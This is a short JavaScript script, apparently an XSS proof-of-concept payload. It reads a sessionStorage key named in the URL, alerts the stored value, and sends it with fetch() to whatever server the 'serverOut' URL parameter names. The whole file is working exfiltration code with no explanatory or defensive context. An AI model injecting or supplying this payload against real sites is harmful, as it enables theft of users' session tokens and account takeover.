const urlParams = new URLSearchParams(window.location.search);

function alertWithSessionCookie(key){
    let sessionValue = sessionStorage.getItem(key)

    alert(sessionValue)

    let serverOut = urlParams.get("serverOut");
    if (!!serverOut){
        fetch(`${serverOut}?session=${encodeURIComponent(sessionValue)}`);
    }
}


function main(){
    let pathKey = urlParams.get("sessionKey");
    !!pathKey ? alertWithSessionCookie(pathKey) : null;
}

main();
